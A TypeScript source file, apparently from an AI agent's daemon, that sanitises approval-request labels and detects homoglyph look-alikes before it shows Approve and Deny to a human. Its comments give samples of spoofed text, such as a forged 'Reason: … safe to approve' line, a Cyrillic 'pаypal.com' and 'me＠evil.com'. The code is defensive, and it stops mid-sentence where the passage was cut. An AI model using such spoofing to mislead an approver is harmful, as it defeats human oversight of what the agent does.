/**
 * Approval Delivery — Pushes approval requests to the user through
 * appropriate channels (WebSocket always, Telegram/Discord too).
 */

import { APPROVAL_SHORT_ID_LENGTH, approvalIntentFromContext, approvalNeedsClick, type ApprovalRequest } from './approval.ts';
import { boundedReceiptText } from '../roles/untrusted.ts';
import { commandForCard } from '../util/card-text.ts';
import { confusableSkeleton } from './ui-intent.ts';
import type { SendOptions } from '../comms/channels/telegram.ts';
import { impactFromCategory } from '../roles/authority.ts';

/**
 * Line breaks, other C0/C1 controls and the two Unicode line separators: every
 * character that can start a new line, or erase one, on a channel that renders
 * text as it arrives. These collapse to a space.
 */
const LABEL_BREAKS = /[\u0000-\u001f\u007f-\u009f\u2028\u2029]+/gu;

/**
 * Every format character (`\p{Cf}`): the bidi embeddings, overrides and
 * isolates that can visually reorder the rest of a line on a client that
 * applies bidi -- `Agent: ` followed by a reversed tail -- and the zero-width
 * characters. A label needs none of them, and they are removed rather than
 * spaced, since none of them stands for a gap.
 */
const LABEL_FORMAT = /\p{Cf}+/gu;

/**
 * One line of an approval card's label, safe to put in front of a human (#651).
 *
 * A card is a few labelled lines -- `Action:`, `Agent:`, `Reason:` -- and a
 * label is text a workflow author, or the composer model, chose. A line break
 * inside one is a forged field (`Daily digest\nReason: routine read, safe to
 * approve`), so breaks collapse to a space. Then `boundedReceiptText` defangs
 * any framing delimiter and cuts, and `...` marks a cut so a shortened label
 * never reads as whole.
 *
 * Text that is already one line, unmarked and within `maxChars` comes back
 * byte-exact.
 */
export function boundedApprovalLabel(text: string, maxChars: number): string {
  const oneLine = text.replace(LABEL_FORMAT, '').replace(LABEL_BREAKS, ' ');
  const bounded = boundedReceiptText(oneLine, maxChars);
  return oneLine.length > maxChars ? `${bounded}...` : bounded;
}

/**
 * Ceiling for a label at the point of DELIVERY, applied to every approval
 * whatever wrote it. It is a backstop, not the bound: the workflow writer in
 * `effect-boundary.ts` bounds its parts first, and the longest label it can
 * compose is the audit `agent_name` -- "Workflow " (9) + a 515-character name
 * + " / " (3) + a 123-character step + " / " (3) + a 68-character effect id +
 * the "as <role>" suffix -- about 720 characters. 1024 sits above that, so it
 * never cuts a label a writer already bounded; it exists for a writer that
 * bounds nothing.
 */
export const APPROVAL_LABEL_DELIVERY_MAX_CHARS = 1024;

/** `U+000A`: a code point as a model can name it back. */
function codePointName(ch: string): string {
  return `U+${ch.codePointAt(0)!.toString(16).toUpperCase().padStart(4, '0')}`;
}

/**
 * Why this code would alter `text` on its way to an approval surface, or null
 * when every surface's text receives it exactly as written (#724).
 *
 * The test is `boundedApprovalLabel` itself at the delivery ceiling, so it
 * cannot drift from what the channel card and the desktop toast do: null means
 * `boundedApprovalLabel(text, APPROVAL_LABEL_DELIVERY_MAX_CHARS) === text`.
 * The other branches only say WHICH alteration it would be, in words a model
 * can act on. That covers what THIS code does to the text, not what a
 * renderer does after it. (Since #718 the channel card is sent as literal
 * text: Telegram with no parse mode, Discord with every markup character
 * escaped. Telegram still turns a URL or an @name into a link, with its text
 * unchanged.)
 *
 * It refuses ordinary text that carries a format character, too: an emoji
 * built with a zero-width joiner, a left-to-right or right-to-left mark in
 * Hebrew or Arabic text, a soft hyphen. Each of those is stripped by the
 * label reduction, so the card would not show what was written.
 */
export function approvalLabelAlteration(text: string): string | null {
  const brk = new RegExp(LABEL_BREAKS.source, 'u').exec(text);
  if (brk) return `it contains a line break, tab or other control character (${codePointName(brk[0])} at position ${brk.index})`;
  const fmt = new RegExp(LABEL_FORMAT.source, 'u').exec(text);
  if (fmt) return `it contains an invisible formatting character (${codePointName(fmt[0])} at position ${fmt.index})`;
  if (text.length > APPROVAL_LABEL_DELIVERY_MAX_CHARS) {
    return `it is ${text.length} characters long; the approval card shows at most ${APPROVAL_LABEL_DELIVERY_MAX_CHARS}`;
  }
  if (boundedApprovalLabel(text, APPROVAL_LABEL_DELIVERY_MAX_CHARS) !== text) {
    return 'it contains text the approval card would rewrite (a content-framing marker or an unpaired surrogate)';
  }
  return null;
}

/**
 * The most text, in display columns, a desktop approval toast may show before
 * its Approve and Deny buttons (#791).
 *
 * The OS cuts a toast's body, not this code: Windows' ToastGeneric template
 * and macOS banners show a few lines and drop the rest, right beside the
 * buttons, so a long body was approved with its tail unseen.
 *
 * THIS IS NOT A MEASUREMENT. Nothing in the daemon can see how much a given
 * machine shows -- that depends on the OS version, banner or alert style,
 * display scaling, font and language -- and it has not been measured on real
 * Windows 11 or macOS banners either. It is a deliberately conservative
 * choice: two lines of about forty Latin characters, which is the smallest
 * layout we design for (a macOS banner shows its body in about two lines;
 * Windows shows more). Text is measured the way it will wrap (`toastLines`):
 * two lines of `TOAST_APPROVABLE_MAX_COLUMNS / 2` columns, filled word by word,
 * a word longer than a line taking as many lines as it needs. A character
 * counts as one column only if it is a precomposed Latin, Greek or Cyrillic
 * letter, ASCII, Latin-1 or a common dash or quote; as two in East Asian wide
 * text and emoji; and any other character -- a ligature like U+FDFD that
 * renders a dozen cells wide, cuneiform, a Letterlike Symbol, a combining or
 * spacing mark, a variation selector, a right-to-left letter -- makes the toast
 * review-only: an unknown width fails closed. Accented Latin text arrives
 * precomposed (NFC) in practice, so it stays approvable.
 *
 * It is the one dial for how often a toast can be approved directly: above
 * it the toast is review-only and approving needs the dashboard. To tighten
 * or loosen it, screenshot real approval toasts on Windows 11 (100% and 150%
 * scaling) and macOS 14/15 (banner and alert styles) with bodies of known
 * length, take the longest that every one of them shows whole together with
 * its ` · <impact>` suffix, and set it at or below that.
 */
export const TOAST_APPROVABLE_MAX_COLUMNS = 80;

/** How many lines the budget is: the narrowest layout shows the body in about two. */
const TOAST_APPROVABLE_LINES = 2;
const TOAST_LINE_COLUMNS = TOAST_APPROVABLE_MAX_COLUMNS / TOAST_APPROVABLE_LINES;

/** Precomposed Latin, Greek and Cyrillic letters, ASCII, Latin-1 and the common dashes, quotes and the euro sign: one Latin cell each. Deliberately narrow (#791 review): Letterlike Symbols such as U+213B and per-mille signs render two or three cells wide, and right-to-left letters reorder the runs around them. U+2024 ONE DOT LEADER is left out (#812 re-review): it is the one punctuation mark here whose skeleton is exactly `.`, so `paypal․com` read as a domain; out of the list its width is unknown and the toast is review-only. */
const ONE_COLUMN = /^[ -~\u00a0-\u024f\u0370-\u03ff\u0400-\u0482\u048a-\u04ff\u1e00-\u1eff\u2010-\u2023\u2025-\u2027\u20ac]$/u;
/** East Asian Wide/Fullwidth text and the emoji and pictograph blocks: two columns. */
const TWO_COLUMNS = /^[\u1100-\u115f\u2600-\u27bf\u2e80-\u303e\u3041-\u33ff\u3400-\u4dbf\u4e00-\u9fff\ua000-\ua4cf\uac00-\ud7a3\uf900-\ufaff\ufe30-\ufe4f\uff00-\uff60\uffe0-\uffe6\u{1f300}-\u{1f64f}\u{1f680}-\u{1f6ff}\u{1f900}-\u{1f9ff}\u{1fa70}-\u{1faff}\u{20000}-\u{3fffd}]$/u;

/** One character's width in columns, or null when it is not known. */
function charColumns(ch: string): number | null {
  if (ONE_COLUMN.test(ch)) return 1;
  if (TWO_COLUMNS.test(ch)) return 2;
  return null;
}

/** Display columns of `text`, or null when any character's width is not known. */
export function toastColumns(text: string): number | null {
  let columns = 0;
  for (const ch of text) {
    const width = charColumns(ch);
    if (width === null) return null;
    columns += width;
  }
  return columns;
}

/**
 * How many toast lines `text` fills when wrapped word by word at
 * `TOAST_LINE_COLUMNS`, stopping as soon as it passes the approvable budget
 * (the body can be a whole command). Infinity when a character's width is not
 * known.
 */
export function toastLines(text: string): number {
  let lines = 1;
  let column = 0;
  // Word by word with indexOf rather than split, so the work stops with the
  // budget instead of first walking the whole body.
  for (let start = 0; start <= text.length;) {
    const space = text.indexOf(' ', start);
    const end = space < 0 ? text.length : space;
    const word = text.slice(start, end);
    start = end + 1;
    const width = toastColumns(word);
    if (width === null) return Number.POSITIVE_INFINITY;
    if (column > 0 && column + 1 + width <= TOAST_LINE_COLUMNS) {
      column += 1 + width;
    } else {
      if (column > 0) lines++;
      lines += Math.max(0, Math.ceil(width / TOAST_LINE_COLUMNS) - 1);
      column = width > TOAST_LINE_COLUMNS ? width % TOAST_LINE_COLUMNS || TOAST_LINE_COLUMNS : width;
    }
    if (lines > TOAST_APPROVABLE_LINES) return lines;
  }
  return lines;
}

/**
 * Scripts a toast body's letters are written in, for `toastLookAlike`. Han,
 * kana, Hangul and Bopomofo count as one, since Japanese and Korean mix them
 * in ordinary text; Common and Inherited letters (modifier letters and the
 * like) belong to no script; any script not listed counts as `other`.
 */
const TOAST_SCRIPTS: ReadonlyArray<[string, RegExp]> = [
  ['latin', /^\p{Script=Latin}$/u],
  ['greek', /^\p{Script=Greek}$/u],
  ['cyrillic', /^\p{Script=Cyrillic}$/u],
  ['cjk', /^[\p{Script=Han}\p{Script=Hiragana}\p{Script=Katakana}\p{Script=Hangul}\p{Script=Bopomofo}]$/u],
];
const NO_SCRIPT = /^[\p{Script=Common}\p{Script=Inherited}]$/u;

function mixesScripts(text: string): boolean {
  let first: string | null = null;
  for (const ch of text) {
    if (!/^\p{L}$/u.test(ch) || NO_SCRIPT.test(ch)) continue;
    const script = TOAST_SCRIPTS.find(([, re]) => re.test(ch))?.[0] ?? 'other';
    if (first === null) first = script;
    else if (script !== first) return true;
  }
  return false;
}

/**
 * Whether a toast body could be a look-alike (#812, #858). Such a toast is
 * review-only, and a chat card with such an Intent line is deny-only (#857).
 *
 * Per LABEL (the owner's choice for #858/#857): the body is cut into labels at
 * whitespace, at `. @ / \ :` and at every other character that is not a letter,
 * digit or mark, so `pаypal.com` is the labels `pаypal` and `com`. A label is
 * a look-alike when:
 * - its letters mix scripts AND its UTS #39 skeleton (`confusableSkeleton`,
 *   #794) differs from it: `pаypal` with a Cyrillic `а`, `Chаse`, `ΡayΡal`;
 * - it holds a non-ASCII letter that reads as ASCII beside ASCII in the same
 *   label (`asciiLookAlike`): `paypaı`, `booĸing`;
 * - or, in a body that has ASCII, a run of labels with no ASCII reads wholly
 *   as ASCII, label by label (`asciiReadingRun`): `Pay $5 to раураӏ`; or one
 *   label does and has 4 or more letters, or 3 with a capital after the first
 *   (`longAsciiReadingLabel`, R5): `Pay $5 to Иван РауРаІ`.
 *
 * Per label rather than per body because a sentence mixing scripts word by
 * word is ordinary (`Send email to Дмитрий`, a Russian subject line, a path
 * with Cyrillic folder names), while a look-alike mixes INSIDE a name or is a
 * whole word that reads as Latin. Before, any confusable letter anywhere in a
 * mixed-script body (`m` -> `rn` is enough) made it review-only.
 *
 * On the whole body: a body with no ASCII written wholly in letters that read
 * as ASCII (`wholeBodyReadsAsAscii`, `рау`), and the same per address-like
 * token (`addressTokenReadsAsAscii`, `раураӏ.сом` in a Russian sentence); a
 * non-ASCII stand-in for `.`, `@`, `/` or `\` set between ASCII
 * (`separatorLookAlike`, `paypal．com`); a letter with a mark below inside a
 * domain, email address or path (`markBelowInAddress`, `pạypal.com`); and a
 * Latin letter with a hook or bar inside one (`hookLetterInAddress`,
 * `paypaƚ.com`).
 *
 * The width allow-list admits Greek and Cyrillic letters because they are one
 * column and legitimate, so on its own it let `pаypal` through: within the
 * budget, every character of known width, and approvable from the surface
 * with the least context and the most casual tap.
 *
 * The cost that remains: a word that puts a Turkish `ı`, a French `æ`/`œ` or
 * `þ` beside ASCII letters (`Dosyayı`, `cœur`) is review-only, as is a word,
 * or a run of words, in another script made only of letters that read as
 * ASCII among ASCII text (`Fly to Куба`, a reply `Ага, хорошо`), and a word
 * of 4 or more such letters, or a 3-letter acronym, anywhere in a body with
 * ASCII or digits (`сахар`, `гора`, `Горох и сахар: 2 кг`, `Send to Саша`,
 * `Pay 300 RUB to МТС`). The check only ever removes Approve.
 */
export function toastLookAlike(body: string): boolean {
  const labels = splitLabels(body);
  return labels.some((label) => (mixesScripts(label) && confusableSkeleton(label) !== label) || asciiLookAlike(label)
    || (STAND_IN_CYRILLIC.test(label) && wholeBodyReadsAsAscii(label)))
    || (ASCII_ALNUM.test(body) && (labels.some(longAsciiReadingLabel) || asciiReadingRun(labels)))
    || wholeBodyReadsAsAscii(body) || addressTokenReadsAsAscii(body) || separatorLookAlike(body)
    || markBelowInAddress(body) || hookLetterInAddress(body);
}

/** What separates labels: anything that is not a letter, digit or combining mark. */
const LABEL_BOUNDARY = /[^\p{L}\p{N}\p{M}]+/u;

/**
 * `text` cut into labels. A character whose skeleton is an address separator
 * (`ADDRESS_SEPARATOR_SKELETON`) cuts too, even a digit or letter (#858
 * review): U+0660 ARABIC-INDIC DIGIT ZERO reads as `.`, and as a digit it
 * kept `раураӏ٠сом` one label, where `м` hid the `раураӏ` before it.
 */
function splitLabels(text: string): string[] {
  let cut = '';
  for (const ch of text) cut += ch > '\x7f' && ADDRESS_SEPARATOR_SKELETON.test(confusableSkeleton(ch)) ? ' ' : ch;
  return cut.split(LABEL_BOUNDARY).filter((label) => label !== '');
}

/**
 * Cyrillic letters that read as ASCII and belong to no national alphabet near
 * Latin text (#858 review), measured over U+04C0-052F: the palochka `ӏ`/`Ӏ`
 * (the one Cyrillic stand-in for `l`) and `ԁ ԛ ԝ Ԍ Ԛ Ԝ` from the Cyrillic
 * Supplement. Left out: Ossetian `ӕ` and Abkhaz `Ӡ`. A label of letters that
 * read as ASCII with one of these in it is a look-alike whatever stands around
 * it, so the run rule's gap (`Отправь $5 на раураӏ`) does not apply to it.
 */
const STAND_IN_CYRILLIC = /[\u04c0\u04cf\u0501\u050c\u051a-\u051d]/u;

/**
 * Russian and Kazakh legal-form acronyms (the owner's list): ООО, ОАО, ЗАО,
 * АО, ТОО, ИП. A company name in a payment (`ООО Ромашка`) leads with one,
 * and ООО, ОАО and ТОО read wholly as ASCII.
 */
const LEGAL_FORM_ACRONYMS: ReadonlySet<string> = new Set(['ООО', 'ОАО', 'ЗАО', 'АО', 'ТОО', 'ИП']);

/**
 * A label that reads wholly as ASCII and is long enough to be a name (the
 * owner's rule R5, for a body that has ASCII): 4 or more counted letters, or
 * 3 or more with an upper-case letter after the first (`АМЕХ`, `МТС`,
 * `РауРаІ`). It closes the run rule's gap: one real word next to the
 * look-alike (`Иван РауРаІ`, `на счёт РауРаІ`) no longer disarms it. Short or
 * title-case words such as Russian `Его` and `Ура` are left to the run rule.
 *
 * Measured costs, deny-only from chat and review-only on the toast next to
 * ASCII or digits: ordinary words made of such letters (`сахар`, `гора`,
 * `Горох и сахар: 2 кг`), a name such as `Саша` in English, and an acronym
 * such as `МТС` (`Pay 300 RUB to МТС`). Misses: a 3-letter lower-case or
 * title-case word (`рау`, `Рау`), and any body with no ASCII
 * (`Перешли пароль на ВВС`).
 */
function longAsciiReadingLabel(label: string): boolean {
  if (LEGAL_FORM_ACRONYMS.has(label) || !wholeBodyReadsAsAscii(label)) return false;
  const counted = [...label].filter((ch) => /^[\p{L}\p{N}]$/u.test(ch) && !modifierWithoutAscii(ch));
  return counted.length >= 4 || (counted.length >= 3 && counted.slice(1).some((ch) => /^\p{Lu}$/u.test(ch)));
}

/**
 * Whether some run of consecutive labels with no ASCII letter or digit reads
 * wholly as ASCII, label by label: `Pay $5 to раураӏ` (the run is `раураӏ`).
 * A run, not a lone label, because short words in other scripts read as ASCII
 * all the time (Russian `о`, `а`, `с`, `его`), and in a sentence of that
 * script they sit beside words that do not (`О плане на среду`). A label with
 * ASCII in it ends a run.
 *
 * A label with no letter or digit that counts (a lone combining mark, a
 * modifier letter such as U+02D1) neither joins nor ends a run (#858 review),
 * so it cannot be used to break one.
 *
 * On its own it is easy to disarm: one real word of the same script next to
 * the look-alike (`Иван РауРаІ`, `на рау`) makes a run that does not read
 * wholly as ASCII, and that is the ordinary shape of a Russian sentence, where
 * a preposition or possessive stands before a name. `longAsciiReadingLabel`
 * (R5) and `STAND_IN_CYRILLIC` cover a longer or capitalised word, or one with
 * a palochka, whatever stands next to it. What still passes is a 3-letter
 * lower-case or title-case word after a real one (`Отправь $5 на рау`); the
 * owner chose per-label checks knowing that main made it review-only.
 */
function asciiReadingRun(labels: string[]): boolean {
  let run = 0;
  let allAscii = true;
  for (const label of [...labels, 'a']) {
    if (ASCII_ALNUM.test(label)) {
      if (run > 0 && allAscii) return true;
      run = 0;
      allAscii = true;
      continue;
    }
    if (!countedLetters(label)) continue;
    run++;
    if (!wholeBodyReadsAsAscii(label)) allAscii = false;
  }
  return false;
}

/** Whether `label` has a letter or digit `wholeBodyReadsAsAscii` counts. */
function countedLetters(label: string): boolean {
  for (const ch of label) if (/^[\p{L}\p{N}]$/u.test(ch) && !modifierWithoutAscii(ch)) return true;
  return false;
}

/** A modifier letter whose skeleton is not ASCII (U+02D1 for a dot): it reads as punctuation, not as a letter of the word. */
function modifierWithoutAscii(ch: string): boolean {
  return /^\p{Lm}$/u.test(ch) && !PRINTABLE_ASCII.test(confusableSkeleton(ch));
}

/** Why a look-alike surface withholds Approve, worded once for the toast, the chat card and the chat refusal. */
export const LOOK_ALIKE_REASON = 'has characters that look like other letters or punctuation';

const ASCII_ALNUM = /[A-Za-z0-9]/;
const PRINTABLE_ASCII = /^[\x20-\x7e]+$/;

/**
 * A non-ASCII letter or digit whose skeleton is plain ASCII, in a body that
 * also has ASCII letters or digits (#812 review): a look-alike WITHIN one
 * script, which `mixesScripts` cannot see. `paypaǀ.com` (U+01C0, a Latin
 * click letter, for `l`) and `mıcrosoft.com` (U+0131 dotless i) are all Latin,
 * inside the width allow-list and the budget, and read as the real names.
 *
 * Measured over the toast's one-column allow-list: 133 letters and 3 digits
 * have an ASCII skeleton, most of them Greek and Cyrillic (already caught
 * above when mixed with Latin), plus the Latin ones that matter here. The
 * cost: a body that mixes ASCII with `ı` (Turkish), `æ`/`œ` (French ligatures,
 * skeleton `ae`/`oe`) or `þ` is review-only. Accented letters are not
 * affected: their skeleton keeps the combining mark, so it is not ASCII.
 *
 * Punctuation is left out on purpose: curly quotes and dashes have ASCII
 * skeletons and are ordinary in model-written text. The stand-ins that matter,
 * for an address's `.`, `@`, `/` and `\`, are `separatorLookAlike`'s (#858).
 */
function asciiLookAlike(body: string): boolean {
  if (!ASCII_ALNUM.test(body)) return false;
  for (const ch of body) {
    if (ch <= '\x7f' || !/^[\p{L}\p{N}]$/u.test(ch)) continue;
    if (LATIN_LOOK_ALIKES.test(ch)) return true;
    const s = confusableSkeleton(ch);
    if (s !== ch && PRINTABLE_ASCII.test(s)) return true;
  }
  return false;
}

/**
 * Letters and digits inside the one-column allow-list that read as ASCII but
 * whose skeleton is not ASCII, so the rule above cannot see them (#812
 * re-review, each measured): kra U+0138 (`booĸing`), U+0185 for `b`, the
 * middle-dot L U+013F/U+0140, the ordinals U+00AA/U+00BA, and the superscript
 * digits U+00B9/U+00B2/U+00B3. Letters with a mark BELOW (`ạ`, `ḷ`) are not
 * listed: flagging them everywhere would cost Vietnamese prose, so they count
 * only inside an address-like token (`markBelowInAddress`, #858).
 */
const LATIN_LOOK_ALIKES = /^[ĸƅĿŀªº¹²³]$/u;

/**
 * A body with no ASCII letter or digit whose every letter and digit reads as
 * ASCII (#858): `рау` all in Cyrillic, or `ｐａｙｐａｌ．ｃｏｍ` all fullwidth.
 * `asciiLookAlike` keys on an ASCII neighbour and `mixesScripts` on a second
 * script, so a body in ONE script with no ASCII passed both.
 *
 * Per letter, not the whole skeleton: punctuation such as `«»` has no ASCII
 * skeleton and must not hide the letters inside it. Real Russian or Greek
 * text keeps its Approve because most of its letters (б is the exception,
 * `6`; but д, ж, и, л, т, λ, π...) have skeletons that are not ASCII.
 * Measured over the region, language, month and day names Intl gives for
 * ru, uk, bg, sr, mk, be, kk, mn and el (366 phrases each): 0 to 8 phrases
 * flagged per language, every one a single short word (`Куба`, `Того`,
 * `Науру`), and 0 for Greek. A sentence of real text has a letter that does
 * not read as ASCII, which is why the same test also runs per address-like
 * token (`addressTokenReadsAsAscii`).
 */
function wholeBodyReadsAsAscii(body: string): boolean {
  if (ASCII_ALNUM.test(body)) return false;
  let letters = 0;
  for (const ch of body) {
    if (!/^[\p{L}\p{N}]$/u.test(ch) || modifierWithoutAscii(ch)) continue;
    if (!PRINTABLE_ASCII.test(confusableSkeleton(ch))) return false;
    letters++;
  }
  return letters > 0;
}

/** A separator, ASCII or a stand-in, between two letters or digits: the shape of `a.b`, `a@b`, `a/b`. */
const INTERIOR_SEPARATOR = /[\p{L}\p{N}\p{M}][.@/\\][\p{L}\p{N}]/u;

/**
 * A whitespace token shaped like an address with a label whose letters all
 * read as ASCII (#858 review): `Открыть аррӏе.со` is ordinary Russian around
 * a Cyrillic `аррӏе.со`, and one real word anywhere switched the whole-body
 * rule off. Per label, so `раураӏ.сом` counts though `м` does not read as
 * ASCII. Only a token with a separator between letters counts, read through
 * its skeleton so a stand-in separator counts too, which keeps the single
 * words the measurement above flagged (`Куба`) approvable. A one-letter label
 * does not count, so abbreviations stay approvable (`т.е.`, "that is", whose
 * `е` reads as `e`; `с.г.`). The cost: a Cyrillic domain with a label such as
 * `сосо` is review-only.
 */
function addressTokenReadsAsAscii(body: string): boolean {
  return body.split(/\s+/u).some((token) => INTERIOR_SEPARATOR.test(confusableSkeleton(token))
    && splitLabels(token).some((label) => [...label].length > 1 && wholeBodyReadsAsAscii(label)));
}

/**
 * The separators that make a token an address: a domain's dot, an email's at,
 * a path's slashes. One character only (#858 review): U+2026 HORIZONTAL
 * ELLIPSIS has the skeleton `...`, and an ellipsis is ordinary punctuation.
 */
const ADDRESS_SEPARATOR_SKELETON = /^[.@/\\]$/;
const ASCII_GRAPHIC = /^[\x21-\x7e]$/;
/** Marks and invisibles a reader does not see as a character, skipped when looking for a stand-in's neighbours. */
const UNSEEN = /^[\p{M}\p{Default_Ignorable_Code_Point}]$/u;

/**
 * A non-ASCII stand-in for `.`, `@`, `/` or `\` with ASCII, or another
 * stand-in, on both sides (#858): `paypal．com` (U+FF0E), `me＠evil.com`
 * (U+FF20), `C:＼Windows`. Found by skeleton, not by a list, so the chat card,
 * which has no width allow-list, catches U+2024 ONE DOT LEADER or U+2215
 * DIVISION SLASH the same way. Measured over the toast's width allow-lists,
 * the one-character stand-ins are U+FF0E; U+FF20; U+FF0F, U+2F03, U+31D2,
 * U+31D3; and U+FF3C, U+2F02, U+31D4.
 *
 * A neighbour is the nearest character a reader sees: combining marks and
 * default-ignorable characters between it and the stand-in are skipped, so
 * `paypal．` + U+FE00 + `com` is still a look-alike on the chat card.
 *
 * Both neighbours, so a sentence that ends in U+FF0E (`Send it to bob．`)
 * or a name that starts with one (`．NET 8`) keeps its Approve. It adds
 * nothing in a body that also has Han, kana or another non-Latin script:
 * there the stand-in's own skeleton differs, so the script-mix rule above
 * already makes the body a look-alike. A colon is left out: a colon alone
 * changes no address (`https：//` still needs a look-alike slash to read as a
 * URL).
 */
function separatorLookAlike(body: string): boolean {
  const chars = [...body];
  const isStandIn = (ch: string | undefined) => ch !== undefined && ch > '\x7f'
    && !/^[\p{L}\p{N}]$/u.test(ch) && ADDRESS_SEPARATOR_SKELETON.test(confusableSkeleton(ch));
  const seen = (i: number, step: number) => {
    while (chars[i] !== undefined && UNSEEN.test(chars[i]!)) i += step;
    return chars[i];
  };
  const asciiSide = (ch: string | undefined) => ch !== undefined && (ASCII_GRAPHIC.test(ch) || isStandIn(ch));
  return chars.some((ch, i) => isStandIn(ch) && asciiSide(seen(i - 1, -1)) && asciiSide(seen(i + 1, 1)));
}

/**
 * Every combining mark below in the blocks a Latin, Greek or Cyrillic letter
 * can carry: canonical combining class 202 (attached below), 218, 220, 222
 * (below) or 233 (double below) in U+0300-036F, U+1AB0-1AFF, U+1DC0-1DFF,
 * U+20D0-20FF and U+FE20-FE2F, measured with Python's unicodedata (Unicode
 * 16). The toast's one-column precomposed letters decompose to ten of them
 * (139 letters); the rest reach the chat card only as decomposed marks, since
 * the toast fails any combining mark closed on width. Tested on the NFD form,
 * so a decomposed `a` + U+0323 counts like the precomposed `ạ`.
 */
const MARK_BELOW = /[\u0316-\u0319\u031c-\u0333\u0339-\u033c\u0347-\u0349\u034d\u034e\u0353-\u0356\u0359\u035a\u035c\u035f\u0362\u1ab5-\u1aba\u1abd\u1abf\u1ac0\u1ac3\u1ac4\u1aca\u1dc2\u1dca\u1dcf\u1dd0\u1df9\u1dfa\u1dfc\u1dfd\u1dff\u20e8\u20ec-\u20ef\ufe27-\ufe2d]/u;

/**
 * A token that reads as a domain (a dot then an ASCII label, `x.com`,
 * `a.co.uk`, `f.ts`), an email address (`a@b`) or a path (`/x`, `~/x`, `./x`,
 * `"/x"`, `--root=/x`, `C:\x`, `a/b/c`, anything with a backslash or `://`).
 *
 * The domain test wants plain ASCII letters after the dot, so a Vietnamese
 * ward abbreviation (`P.Bạch Mai`) is not a domain, nor is a missing space
 * before a word with a mark (`bạn.Tôi`). A missing space before a plain ASCII
 * word is (`được.Anh`), which costs that sentence its Approve. A mark below in
 * the last label (`paypal.cọm`) is not caught: such a label cannot be
 * registered, and a full URL is caught by its `://`. One slash between words
 * (`và/hoặc`, "and/or") is not a path, so neither is a relative path with
 * one slash (`etc/pạsswd`); the two cannot be told apart.
 */
const DOMAIN_LIKE = /[\p{L}\p{N}\p{M}]\.[A-Za-z]{2,}(?![\p{L}\p{N}\p{M}])/u;
const EMAIL_LIKE = /[\p{L}\p{N}\p{M}]@[\p{L}\p{N}]/u;
const PATH_LIKE = /(?:^|[^\p{L}\p{N}\p{M}])(?:~|\.{1,2})?\/|^[A-Za-z]:[\\/]|\\|:\/\/|\/.*\//u;

/**
 * A letter with a mark below inside a domain-, email- or path-like token
 * (#858, the owner's choice): `pạypal.com`, `bịll@paypal.com`, `/etc/pạsswd`.
 * The skeleton does not fold a mark below and the mark is easy to miss at
 * toast size, so the token reads as the ASCII name. In ordinary text the same
 * letters stay approvable: Vietnamese writes them in almost every word.
 *
 * The cost: a real Vietnamese, Romanian (`ș`, `ț`), Polish (`ą`, `ę`) or
 * Turkish (`ş`, `ç`) domain, address or path is review-only on the toast and
 * deny-only from chat (#857).
 */
function markBelowInAddress(body: string): boolean {
  for (const token of body.split(/\s+/u)) {
    const nfd = token.normalize('NFD');
    if (MARK_BELOW.test(nfd) && addressLike(nfd)) return true;
  }
  return false;
}

/** Whether an NFD token reads as a domain, an email address or a path. */
function addressLike(nfd: string): boolean {
  return DOMAIN_LIKE.test(nfd) || EMAIL_LIKE.test(nfd) || PATH_LIKE.test(nfd);
}

/** Latin Extended-B, IPA, the phonetic extensions, Latin Extended-D and -E: where the hooked and barred letters live. */
const HOOK_LETTER_BLOCKS = /^[\u0180-\u02af\u1d00-\u1dbf\ua720-\ua7ff\uab30-\uab6f]$/u;
/** Letters of those blocks that are ordinary orthography (Ewe, Akan and other West African `ɛ`/`ɔ`, Azerbaijani `ə`), with the Latin-1 and Extended-A `ł ø đ ŋ` the owner named, which sit outside the blocks anyway. */
const ADDRESS_ORTHOGRAPHY = /^[łŁøØđĐŋŊɛƐɔƆəƏ]$/u;

/**
 * A precomposed Latin letter with a hook, bar or other built-in stroke inside
 * an address-like token (#858 review): `paypaƚ.com` (U+019A, l with bar),
 * `ɡoogle.com` (U+0261, script g). They do not decompose, so `MARK_BELOW` cannot
 * see them, and their skeleton is not ASCII, so `asciiLookAlike` cannot either.
 * Only non-decomposing letters in the blocks above, less `ADDRESS_ORTHOGRAPHY`;
 * and, wherever it sits, any letter whose skeleton carries a stroke overlay
 * (#858 review): `ħotmail.com`, `ŧwitter.com`, `ðropbox.com` are Latin-1 and
 * Extended-A, outside the blocks.
 * The cost: a domain or path in Hausa (`ɓ`, `ɗ`, `ƙ`), Maltese (`ħ`), Sami
 * (`ŧ`), Icelandic or Faroese (`ð`), or another orthography that uses these
 * letters is review-only.
 */
const STROKE_OVERLAY = /[\u0335\u0336\u0338]/u;
function hookLetterInAddress(body: string): boolean {
  for (const token of body.split(/\s+/u)) {
    if (!addressLike(token.normalize('NFD'))) continue;
    for (const ch of token.normalize('NFC')) {
      if (!/^\p{L}$/u.test(ch) || ADDRESS_ORTHOGRAPHY.test(ch)) continue;
      if (HOOK_LETTER_BLOCKS.test(ch) && ch.normalize('NFD') === ch) return true;
      if (STROKE_OVERLAY.test(confusableSkeleton(ch))) return true;
    }
  }
  return false;
}

/** The longest prefix of `text` that fits `max` columns, an unknown width counted wide. */
function fitColumns(text: string, max: number): string {
  let columns = 0;
  let out = '';
  for (const ch of text) {
    columns += charColumns(ch) ?? 4;
    if (columns > max) break;
    out += ch;
  }
  return out;
}

/** A `notify.show` payload for one approval, and whether it offers Approve. */
export type ApprovalToast = {
  id: string;
  /** `approval` carries Approve/Deny; `approval_review` only opens Jarvis. */
  kind: 'approval' | 'approval_review';
  title: string;
  body: string;
  meta: string;
  destructive: boolean;
  actions: Array<{ id: string; label: string; primary?: boolean }>;
  approvable: boolean;
};

/**
 * The desktop approval toast (`notify.show` to every sidecar, daemon/index.ts).
 *
 * The body is what will happen (`approvalIntentParts`, #789); the meta is the
 * impact, the tool and then why approval was needed. The sidecar renders
 * `body · meta` as one text under the title, and the OS cuts it to a few lines
 * (#791). So the part the person decides on -- the body, then the impact that
 * leads the meta -- must fit `TOAST_APPROVABLE_MAX_COLUMNS` as it wraps
 * (`toastLines`) for the toast to carry Approve and Deny. What follows the impact may be cut
 * by the OS, and is never what the decision is about.
 *
 * So is a body that fits but could be a cross-script look-alike
 * (`toastLookAlike`, #812), shown whole with that reason in the meta.
 *
 * Above the budget the toast is review-only: no Approve, no Deny, an "Open
 * Jarvis" action, the body cut here with a visible `...`, and its own kind,
 * `approval_review`. The kind matters, not just the action list: the macOS
 * sidecar takes a notification's buttons from a category registered per kind,
 * and the `approval` category always has Approve and Deny, whatever actions
 * the payload lists. An `approval_review` kind is not a registered category on
 * any sidecar shipped so far, which macOS renders with no buttons (tapping the
 * banner still opens Jarvis), and the daemon acts on a notification's
